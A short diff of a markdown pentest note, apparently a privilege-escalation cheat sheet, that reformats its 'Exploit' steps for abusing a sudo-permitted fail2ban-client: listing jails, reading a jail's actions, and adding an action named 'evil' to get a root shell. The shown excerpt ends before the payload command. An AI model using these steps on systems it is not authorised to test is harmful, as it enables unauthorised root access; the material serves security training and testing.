@@ -82,11 +82,15 @@ sudo -l
 
 **If we can execute fail2ban-client command as root, we may be able to escalate privilege and gain a root shell.**
 
-# Exploit
+# Exploit : 
 
-# Get jail list
-sudo /usr/bin/fail2ban-client status
-# Choose one of the jails from the "Jail list" in the output.
+step 1:
+### Get jail list
+
+**sudo /usr/bin/fail2ban-client status**
+
+## step 2 : 
+### Choose one of the jails from the "Jail list" in the output.
 sudo /usr/bin/fail2ban-client get <JAIL> actions
 # Create a new action with arbitrary name (e.g. "evil")
 sudo /usr/bin/fail2ban-client set <JAIL> addaction evil
